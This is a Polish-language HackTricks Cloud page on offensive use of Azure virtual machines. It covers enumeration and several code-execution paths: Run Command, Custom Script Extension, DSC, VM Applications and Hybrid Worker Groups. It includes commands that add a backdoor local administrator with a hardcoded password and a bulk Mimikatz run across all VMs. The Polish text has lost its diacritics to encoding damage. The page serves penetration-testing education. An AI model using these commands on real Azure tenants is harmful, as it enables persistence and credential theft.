# Az - Maszyny wirtualne i sie

{% hint style="success" %}
Dowiedz si i wicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz si i wicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostpniaj sztuczki hackingu, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Podstawowe informacje

[Z dokumentacji:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Maszyny wirtualne Azure to jedne z kilku rodzaj贸w [zasob贸w obliczeniowych na 偶danie i skalowalnych](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree), kt贸re oferuje Azure. Zazwyczaj wybierasz maszyn wirtualn, gdy potrzebujesz wikszej kontroli nad rodowiskiem obliczeniowym ni偶 oferuj inne opcje. Ten artyku zawiera informacje na temat tego, co powiniene rozwa偶y przed utworzeniem maszyny wirtualnej, jak j utworzy i jak ni zarzdza.

## Informacje o sieci Azure

Sieci Azure zawieraj **r贸偶ne jednostki i sposoby konfiguracji.** Mo偶esz znale藕 kr贸tkie **opisy,** **przykady** i **polecenia wyliczajce** r贸偶ne jednostki sieci Azure w:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** oferuje bezpieczne, w peni zarzdzane rozwizanie dostpu RDP (Remote Desktop Protocol) i SSH (Secure Shell) za porednictwem SSL przez portal Azure. Jest zintegrowany w ramach wirtualnej sieci Azure, umo偶liwiajc czno RDP i SSH z maszynami wirtualnymi za pomoc prywatnych adres贸w IP, eliminujc konieczno u偶ywania adres贸w IP publicznych. Jest to bezpieczniejsza i wygodniejsza alternatywa dla tradycyjnych metod polegajcych na przypisywaniu adres贸w IP publicznych i konfiguracjach regu NSG dla dostpu do maszyn wirtualnych. Programici i personel IT mog bezpiecznie uzyskiwa dostp do maszyn wirtualnych z portalu Azure za pomoc przegldarek internetowych, usprawniajc proces dla rodowisk deweloperskich i testowych.

Aby wywietli wszystkie hosty Azure Bastion w swojej subskrypcji, mo偶na u偶y nastpujcego polecenia:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## Wymienianie maszyn wirtualnych
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Uruchamianie polece w VM**

### **Logowanie AAD w VM**

Istnieje mo偶liwo umo偶liwienia dostpu dla u偶ytkownik贸w uwierzytelnionych za porednictwem AzureAD. Na przykad, pr贸bujc uzyska dostp do **VM z systemem Linux**: `ssh nazwa_u偶ytkownika@azure-corp.com@1.1.1.1` (wa偶ne jest **u偶ycie adresu e-maila** z azurecorp u偶ywanego podczas pr贸by logowania), mo偶esz otrzyma bd:
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Po prostu **postpuj zgodnie z tymi instrukcjami**, przechodzc pod adres [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) i podajc kod, u偶yj adresu e-mail i hasa jako powiadcze, a bdziesz m贸g poczy si za pomoc SSH (jeli u偶ytkownik ten ma wystarczajce uprawnienia do tego: rola `Logowanie Administratora Wirtualnej Maszyny` lub `Logowanie U偶ytkownika Wirtualnej Maszyny`).

### **Uruchom polecenie**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Uruchom rozszerzenie skryptu niestandardowego**

Rozszerzenia maszyny wirtualnej (VM) w Azure to **mae aplikacje**, kt贸re zapewniaj konfiguracj po wdro偶eniu i automatyzacj **zada** na **VM Azure**. Na przykad, jeli maszyna wirtualna wymaga instalacji oprogramowania, ochrony antywirusowej lub mo偶liwoci uruchomienia skryptu wewntrz niej, mo偶na u偶y rozszerzenia VM.

Dlatego, jeli masz dostp do zapisania go, mo偶esz wykona dowolny kod:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### StanKonfiguracjiDocelowy (DSC)

StanKonfiguracjiDocelowy (DSC) to narzdzie PowerShell podobne do Ansible, u偶ywane do konfigurowania hosta za pomoc kodu. DSC integruje si z Azure, umo偶liwiajc przesyanie okrelonych plik贸w konfiguracyjnych. Te pliki musz przestrzega cisej skadni. Warto zauwa偶y, 偶e rozszerzenie DSC w Azure mo偶e wykonywa polecenia z plik贸w speniajcych okrelone kryteria formatowania, nawet jeli skadnia nie jest poprawna zgodnie ze standardami DSC, jak pokazano na dostarczonym rysunku.

Wykonanie tych polece uatwia funkcja [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) w Az PowerShell. Wymagania obejmuj plik **.PS1** z zdefiniowan funkcj, kt贸ry musi zosta spakowany do pliku **.zip**. Nawet jeli skadnia mo偶e nie by dokadna dla DSC, kod i tak zostanie wykonany. Jednak rozszerzenie oznaczy status wykonania jako "niepowodzenie", a 偶adne wyniki z polecenia nie bd widoczne ze wzgldu na nadpisanie statusu przez komunikat o bdzie.

### Definicje Aplikacji VM

Definicje Aplikacji VM umo偶liwiaj powtarzalne wdra偶anie zaktualizowanych aplikacji na maszyn wirtualn Azure. Ten zas贸b obsuguje wdra偶anie i aktualizacj aplikacji na maszynach wirtualnych. Aby to skonfigurowa, wymagane jest wykonanie kilku krok贸w, w tym u偶ycie polece takich jak **`New-AzGalleryApplication`** i **`New-AzGalleryApplicationVersion`** w Az PowerShell.

Wykonanie aplikacji lub polece za pomoc tej metody obejmuje **"VMAppExtension"**, kt贸ry jest instalowany automatycznie, gdy aplikacja jest stosowana do maszyny wirtualnej. Rozszerzenie pobiera plik z okrelonego URI i nadaje mu dokadnie tak sam nazw jak aplikacja, bez rozszerzenia. Aby poprawnie wykona plik, pole "ManageActions" w wywoaniu interfejsu API REST musi by skonfigurowane tak, aby zmieni nazw pliku na odpowiednie rozszerzenie. Po zakoczeniu konfiguracji tej metody, struktura bdzie przypomina t przedstawion na dostarczonym rysunku.

Jednak ta metoda wykonania jest stosunkowo wolna, zajmujc okoo 3-4 minuty na wykonanie aplikacji lub polecenia. Pliki zwizane z tym procesem s przechowywane w okrelonych katalogach (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` dla kopii aplikacji i `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\` dla statusu wykonania).

Obie techniki zapewniaj unikalne sposoby wykonywania polece i wdra偶ania aplikacji w rodowiskach Azure, ka偶da z wasnym zestawem wymaga, krok贸w i rozwa偶a.

### Grupy Hybrydowych Pracownik贸w (HWGs) w Azure

[**Grupy Hybrydowych Pracownik贸w (HWGs)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) to funkcja w Azure, kt贸ra pozwala na wykonanie Runbook贸w skonfigurowanych w Koncie Automatyzacji na maszynie wirtualnej Azure (VM), kt贸ra jest czci wyznaczonej HWG. Wykonanie to jest uatwione dziki rozszerzeniu zainstalowanemu na VM, kt贸re wdra偶a kod Runbooka na VM. Istotnym aspektem tego procesu jest to, 偶e faktyczne powiadczenia nie maj znaczenia podczas wykonania, poniewa偶 kod jest uruchamiany z podwy偶szonymi uprawnieniami, konkretnie jako **SYSTEM** lub root, jak zilustrowano na dostarczonym rysunku.

Wa偶nym szczeg贸em dla os贸b korzystajcych z maszyn wirtualnych z systemem Windows 10 jest konieczno okrelenia wersji PowerShell dla Runbooka. Powinna ona by ustawiona na uruchamianie jako wersja PowerShell 5.1 zamiast 7.1. Wymaganie to wynika z faktu, 偶e PowerShell 7.1 nie jest domylnie zainstalowany na tych maszynach wirtualnych, co prowadzi do niepowodzenia wykonania skryptu, jeli okrelono wersj 7.1.

Ta funkcja Azure oferuje solidn metod automatyzacji i zarzdzania zadaniami w rodowiskach hybrydowych, umo偶liwiajc scentralizowane zarzdzanie i wykonywanie zada na maszynach wirtualnych Azure.


## Odnoniki

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

{% hint style="success" %}
Naucz si i wicz Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naucz si i wicz Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostpnij sztuczki hackingu, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
